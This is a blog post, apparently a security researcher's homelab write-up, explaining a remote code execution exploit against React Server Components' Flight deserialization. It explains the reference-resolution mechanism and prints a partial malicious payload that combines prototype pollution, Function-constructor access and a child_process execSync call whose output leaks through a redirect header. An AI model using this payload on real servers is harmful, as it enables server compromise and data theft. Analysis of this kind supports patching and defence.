---
layout: default
title: "React2Shell- Achieving RCE in React Server Components"
date: 2025-12-05
categories: security
---

# React2Shell: Achieving RCE in React Server Components

For those following react2shell exploits, I finally managed to successfully exploit RCE. This was purposely done in a controlled homelab environment for security research purposes, especially since there are now cyber threat groups from China exploiting these vulnerabilities.

## Background

At a high level, this vulnerability affects the React Flight Protocol used in React Server Components (RSC) to serialize data and components when they need to be sent to the client and then deserialize them. The objects are stored in a chunks array that use colons as delimiters to reference them.

## Understanding Reference Resolution

An example of how the reference resolution works:

Assume you're trying to pull the name of the cat from the below object. In React, to reference the name it would be `"$1:cat:name"`:

```javascript
chunks[1] = {
  cat: {
    name: "Pudin",
    age: 15
  }
}
```

The resolution process:

```javascript
value = chunks[1]           // Go to Chunk ID 1 = {cat: {...}}
value = value["cat"]        // = {name: "Pudin", age: 15}
value = value["name"]       // = "Pudin"
```

## Exploitation Process

### Request 1: Triggering the Error

Asking the server to retrieve cat.name from chunks[1] but we have sent an empty object {} that has no cat property. This should error out the server with a 500 error.

```javascript
chunks[0] = ["$1:cat:name"]
chunks[1] = {}
```

Step-by-step breakdown:

```javascript
// Step 1: Start at chunks[1]
value = chunks[1]              // = {}

// Step 2: Access "cat" property
value = value["cat"]           // = {}.cat = undefined ← No cat 

// Step 3: Access "name" property
value = value["name"]          // = undefined.name → 500 error
```

![Request showing undefined name error](/assets/images/IoC-poc.png)

If we had a proper object sent instead on an empty one the server would return a 200 status code such as the below:

![Successful payload delivery](/assets/images/name-poc.png)

### Request 2: Malicious Payload

This leverages a malicious object which has key elements:

- Prototype pollution
- Function constructor access
- Code execution
- Command output exfiltrated via x-action-redirect header
- Full RCE achieved

```javascript
chunks[0] = {malicious object}
chunks[1] = "$@0" (reference to chunks[0])
chunks[2] = []
```


![RCE proof of concept](/assets/images/rce_poc.png)

## Malicious Object Breakdown

```javascript
{
  "then": "$1:__proto__:then",
  "status": "resolved_model",
  "reason": -1,
  "value": "{\"then\":\"$B1337\"}}",
  "_response": {
    "_formData": {
      "get": "$1:constructor:constructor"
    },
    "_prefix": "var res=process.mainModule.require('child_process').execSync('id').toString();...",
    "_chunks": "$Q2"
  }
}
```

Key components:

- `"then": "$1:__proto__:then"` - Prototype pollution that rewrites the global prototype template
- `"status": "resolved_model"` - Tricks React into treating malicious object as legitimate resolved data
- `"_formData": {"get": "$1:constructor:constructor"}` - Function constructor access that enables arbitrary JavaScript execution
- `"_prefix": "var res=process.mainModule.require('child_process').execSync('id')..."` - Imports child_process module, executes system command, captures output, and exfiltrates via NEXT_REDIRECT error
- `"_chunks": "$Q2"` - Points to empty array [] to complete deserialization

This leads to the server executing the `id` command and having the output exfiltrated via HTTP redirect header for RCE.



## Impact

This vulnerability demonstrates a critical flaw in how React Server Components handle deserialization. Successful exploitation allows:

- Remote code execution on the server
- Data exfiltration through redirect headers
- Complete system compromise

## Conclusion

This research was conducted in a controlled environment to better understand the attack surface of React Server Components. Organizations using RSC should ensure they are running patched versions and implement proper input validation on all server-side deserialization operations.

**Disclosure**: This research was conducted in a private homelab environment for educational and defensive security purposes only.
